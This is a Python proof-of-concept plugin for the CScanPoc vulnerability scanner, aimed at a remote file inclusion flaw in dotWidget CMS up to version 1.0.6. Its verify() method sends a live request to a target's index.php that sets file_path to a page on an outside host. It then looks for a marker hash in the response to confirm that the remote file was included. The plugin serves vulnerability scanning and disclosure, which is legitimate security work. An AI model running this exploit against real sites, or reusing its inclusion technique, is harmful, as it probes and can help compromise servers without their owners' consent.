# coding: utf-8

from CScanPoc.thirdparty import requests
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
import re


class Vuln(ABVuln):
    vuln_id = 'dotWidget_0000'  # 平台漏洞编号
    # 漏洞名称
    name = 'dotWidget CMS <= 1.0.6 (file_path) Remote File Include Vulnerabilities'
    level = VulnLevel.MED  # 漏洞危害级别
    type = VulnType.RFI  # 漏洞类型
    disclosure_date = '2014-07-01'  # 漏洞公布时间
    desc = '''
        dotWidget CMS 1.0.6及其以下版本存在远程文件包含漏洞。
    '''  # 漏洞描述
    ref = 'https://www.seebug.org/vuldb/ssvid-63616'  # 漏洞来源
    cnvd_id = 'Unknown'  # cnvd漏洞编号
    cve_id = 'Unknown'  # cve编号
    product = 'dotWidgetCMS'  # 漏洞组件名称
    product_version = '<= 1.0.6'  # 漏洞应用版本


class Poc(ABPoc):
    poc_id = '36423e72-09c8-4f95-9638-dbfd303eed84'  # 平台 POC 编号
    author = '国光'  # POC编写者
    create_date = '2018-06-01'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())
        self.option_schema = {
            'properties': {
                'base_path': {
                    'type': 'string',
                    'description': '部署路径',
                    'default': '',
                    '$default_ref': {
                        'property': 'deploy_path'
                    }
                }
            }
        }

    def verify(self):
        self.target = self.target.rstrip(
            '/') + '/' + (self.get_option('base_path').lstrip('/'))
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))
            arg = '{target}'.format(target=self.target)
            vul_url = arg + '/index.php?file_path=http://www.sqlsec.com/admin.html'
            response = requests.get(vul_url).text

            if re.search('765635a65f5919b89a990aaf0cb168d7', response):
                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                    target=self.target, name=self.vuln.name))

        except Exception as e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        self.verify()


if __name__ == '__main__':
    Poc().run()
